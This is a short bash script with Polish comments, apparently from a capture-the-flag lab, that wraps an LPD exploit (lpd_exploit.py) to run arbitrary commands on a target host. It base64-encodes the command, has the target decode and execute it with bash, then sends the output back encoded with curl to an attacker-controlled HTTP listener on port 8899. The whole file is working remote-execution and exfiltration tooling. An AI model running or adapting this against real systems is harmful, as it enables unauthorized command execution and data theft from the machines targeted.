#!/usr/bin/env bash
# Wyślij komendę na target przez LPD, wynik → curl na Kali (port 8899).
TARGET="${1:-10.129.41.146}"
LHOST="${LHOST:-10.10.17.138}"
PORT="${PORT:-8899}"
TAG="${2:-enum}"
CMD="${3:?usage: lpd_enum.sh TARGET tag 'command'}"
B64=$(echo -n "$CMD" | base64 -w0)
python3 "$(dirname "$0")/lpd_exploit.py" "$TARGET" -c "echo $B64 | base64 -d | bash 2>&1 | base64 -w0 | xargs -I{} curl -s http://${LHOST}:${PORT}/${TAG}/{}"
echo "[*] sent tag=$TAG — sprawdź log http.server $PORT (decode: echo B64 | base64 -d)"